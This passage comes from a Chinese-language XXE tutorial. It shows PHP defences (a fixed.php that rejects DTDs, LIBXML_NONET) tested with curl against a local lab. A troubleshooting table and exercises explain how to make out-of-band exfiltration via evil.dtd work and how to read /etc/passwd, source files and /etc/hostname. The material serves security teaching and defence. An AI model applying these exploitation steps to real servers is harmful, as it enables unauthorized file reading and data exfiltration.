**第一道：不传 `LIBXML_NOENT`。** 默认参数下外部实体不加载、不替换，XXE 的全部利用——读文件、发请求、外带——一起失效。safe.php 与第 5 节的对照就是证据：同一个 OOB payload 打上去，攻击者服务器连一次请求都没收到（evil.dtd 都没被拉取），响应里只有空字段。==业务上不需要实体替换时，这一个参数的缺席就是修复的主体==。

**第二道：拒绝带 DTD 的提交体。** 需要防御"库版本旧"或"哪天有人把 NOENT 加回去"时，在解析前检查原始提交体，出现 `<!DOCTYPE` / `<!ENTITY` 直接拒绝。修复靶 fixed.php：

```php
<?php
// fixed.php —— 修复靶：默认参数解析 + 提交体里出现 DTD 直接拒绝
$raw = file_get_contents('php://input');
if (stripos($raw, '<!doctype') !== false || stripos($raw, '<!entity') !== false) {
    http_response_code(400);
    exit("DTD rejected\n");
}
$data = simplexml_load_string($raw);
if ($data === false) {
    echo "parse failed\n";
    exit;
}
echo "username: ", $data->username ?? '(missing)', "\n";
```

同一组 payload 打三遍：

```bash
curl -s --noproxy '*' --data-binary @p_normal.xml http://127.0.0.1:9110/fixed.php
curl -s -i --noproxy '*' --data-binary @p_oob.xml http://127.0.0.1:9110/fixed.php | head -5
curl -s --noproxy '*' --data-binary @p_file.xml http://127.0.0.1:9110/fixed.php
```

输出：

```
username: alice
```

```
HTTP/1.1 400 Bad Request
Host: 127.0.0.1:9110
Date: Fri, 23 Oct 2026 14:33:22 GMT
Connection: close
X-Powered-By: PHP/8.5.4
```

```
DTD rejected
```

正常业务请求照常通过，两类 payload 都在 400 上拦死。==拒 DTD 的本质是按能力禁而不是按漏洞禁==：实体替换、外部子集、递归展开三条路全部要从 DOCTYPE/ENTITY 走，掐掉入口，第 7 节的 DoS 一并消失。

**第三道：版本与纵深。** libxml ≥ 2.9 的默认反转挡住的是"忘了传参"的旧代码，升级是底线不是全部——`LIBXML_NOENT` 一传就破，所以第一、二道才是主体。纵深上另有一个解析选项 `LIBXML_NONET`，解析时禁用网络访问，可挡 OOB 外带与内网探测；它管不到本地 `file://`，与白名单配合使用。生产环境关 `display_errors`：第 6 节整条报错回显通道的前提就是报错进响应，关掉即消失。组织面上与 [[W10-SSRF|W10]] 的出口管控呼应：解析端能发出去的请求同样该过白名单。

## 10. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| payload 发过去响应正常但内容为空 | 解析端默认参数解析，外部实体不加载不替换（静默无效）：自建靶给解析调用补 `LIBXML_NOENT`；真实靶记录现象换思路（[[#2.2 开关二：PHP 要显式传 LIBXML_NOENT\|2.2]]） |
| 传了 LIBXML_NOENT 还是打不出 | 三查：libxml 版本是否 ≥ 2.9（老库行为完全不同，[[#2.1 开关一：libxml 2.9 起外部实体默认不加载\|2.1]]）；OOB 型 payload 的嵌套是否写进了内部子集（必须外部 DTD 中转，[[#5.1 内部子集的两条限制\|5.1]]）；`%remote;` 是否声明了却忘了引用 |
| 响应里出现字面 `&xxe;` 字符 | 实体名拼错（报 Entity not defined 时看报错行）；或解析端没传 NOENT 且内部实体未被展开的解析组合：先看响应与报错差异再改 payload |
| OOB 打了攻击者服务器没有收到任何回连 | 按 [[#5.2 全链：远程 DTD 组装外带\|5.2]] 的链逐环查：`%remote;` 引用缺、evil.dtd 里 `%eval;`/`%send;` 少引用、攻击者服务器没起或端口/文件名不对 |
| 日志里只有 evil.dtd 没有 `?d=` 请求 | `%send;` 没被触发：evil.dtd 末尾两行 `%eval;` 与 `%send;` 的引用次序或缺漏（[[#5.2 全链：远程 DTD 组装外带\|5.2]]） |
| 外带 URL 的数据被截断 | 拼进 URL 的内容没编码：先 base64；实体值里写 `&` 要写成 `&amp;`，字面 `&` 会把 URL 从查询串处截断 |
| `file://` 读不到文件 | 相对路径按解析进程的工作目录解析：改绝对路径；确认解析端运行用户对目标文件有读权限 |
| 内部子集里嵌参数实体报 PEReferences forbidden | XML 规范限制，不是配置问题：嵌套组装外带 URL 的那一步必须放进外部 DTD（[[#5.1 内部子集的两条限制\|5.1]]） |
| 报错回显拿不到内容 | 生产环境报错不进响应：这条路只活在 `display_errors` 开着的靶上，换 OOB（[[#6. 报错回显\|6]]） |
| docx/svg 靶 payload 无效 | 先确认解析端是谁：Java 生态的解析器开关与语法都不同；包内路径写错（docx 的注入点在 `word/document.xml`，zip 结构要对）（[[#8.1 什么输入点值得测\|8.1]]） |
| curl 发 payload 报 parse failed | body 在传输层被改动：`--data-binary @文件` 原样发送；文本节点里的 `&`、`<` 要先转义成实体 |
| 打 safe.php 什么反应都没有 | 预期行为：默认参数下外部实体静默不加载，不报错——用第 9 节的视角看，它就是修复后的样子（[[#9. 防御\|9]]） |

## 11. 配套练习与延伸阅读

> [!note] 实战任务
> 在 [[01-练习平台索引|01 章]]收录的综合题库里按标签筛出两道 XXE 题（CTFshow Web 入门、BUUCTF Web 区都有收录），每道按本章流程走：先用 [[#8.1 什么输入点值得测|8.1]] 认输入点，再按第 4–6 节选通道。至少一道要打到 OOB 外带全程——只打有回显的题练不到本章的主线。

配套练习：

1. 把 vuln.php 的解析换成 `DOMDocument::loadXML($raw, LIBXML_NOENT)`，重打第 4–6 节的全部 payload——[[#2.2 开关二：PHP 要显式传 LIBXML_NOENT|2.2]] 已给出两个 API 的行为对照，动手确认利用链也一致。
2. 把 evil.dtd 里 `%file;` 的 resource 先后换成 `/etc/passwd` 与 `php://filter/convert.base64-encode/resource=safe.php`，各走一遍 OOB 全链——体会通道不变、资源随意换。
3. 对 p_oob.xml 做两个改动再打：删掉内部子集里的 `%remote;` 引用行；把 evil.dtd 里的 `&#x25;` 换成字面 `%`。用攻击者日志的变化分别回答"DTD 为什么必须被引用才加载"与"实体值里为什么不能写字面 `%`"（[[#5.2 全链：远程 DTD 组装外带|5.2]]）。
4. 用报错回显通道读 `/etc/hostname` 并解码；随后对 fixed.php 打同一 payload，说明它在哪一道防线被拦、以及若把靶换回 safe.php 又会停在哪一步。

延伸阅读：

- W3C XML 1.0 规范（XML 1.0 Specification）的 Physical Structures 一章：实体的定义、参数实体在内部/外部子集的引用规则原文，5.1 节两条限制的出处；
- PHP 手册的 libxml 预定义常量页：`LIBXML_NOENT`、`LIBXML_NONET`、`LIBXML_DTDLOAD` 等选项的权威语义，第 2、9 节开关的原始依据；
- OWASP 的 XML External Entity Prevention Cheat Sheet：按语言与解析器列的防御清单，第 9 节的扩展阅读；
- PayloadsAllTheThings 仓库的 XXE 篇：变体 payload 与编码技巧的索引，本章链路都能在那里找到更多形态；
- 复盘对照：[[W10-SSRF|W10]] 的出口管控与本节的 `LIBXML_NONET` 是同一思想在两个层面的落点；[[W06-文件包含|W06]] 的伪协议与本章的实体 SYSTEM 共享同一套 PHP 流抽象——三章连读，"服务器去读一个 URL"这件事的三种入口就齐了。
